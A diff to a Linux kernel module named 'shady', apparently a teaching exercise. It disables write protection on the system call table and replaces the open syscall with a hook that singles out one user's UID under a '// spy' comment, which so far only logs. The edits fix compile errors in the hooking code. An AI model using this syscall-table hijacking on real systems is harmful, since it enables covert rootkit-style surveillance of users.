@@ -221,15 +221,13 @@ asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage int my_open (const char* file, int flags, int mode) 
 {
   unsigned int current_user_id;
-  current_user_id = get_current_user()->uid;
-  printk("My open is called.");
-  prinkt("Current UID = %u\n", current_user_id);  
+  current_user_id = get_current_user()->uid.val;
+  printk("My open is being called\n");
   if (current_user_id == marks_uid) {
     // spy
+    printk("mark is about to open\n");
   }
-  else {
-    // don't spy
-  } 
+
   // Call the original open syscall
   return old_open(file, flags, mode);
 }
@@ -285,12 +283,13 @@ shady_init_module(void)
 
   // Turn off write protection on the system call table
   set_addr_rw(system_call_table_address);
+  void** system_call_table = (void**) system_call_table_address;
 
   // Store the real "open" syscall away
-  old_open = (void *) system_call_table_address[__NR_open];  
+  old_open = system_call_table[__NR_open];  
 
   // Load in new "my_open" syscall in its place
-  system_call_table_address[__NR_open] = (void *) my_open;
+  system_call_table[__NR_open] = my_open;
   
   return 0; /* success */
 
@@ -303,7 +302,8 @@ static void __exit
 shady_exit_module(void)
 {
   // Restore the original "open" syscall
-  system_call_table_address[__NR_open] = (void *) old_open;  
+  void** system_call_table = (void**) system_call_table_address;
+  system_call_table[__NR_open] = old_open;  
 
   shady_cleanup_module(shady_ndevices);
   return;
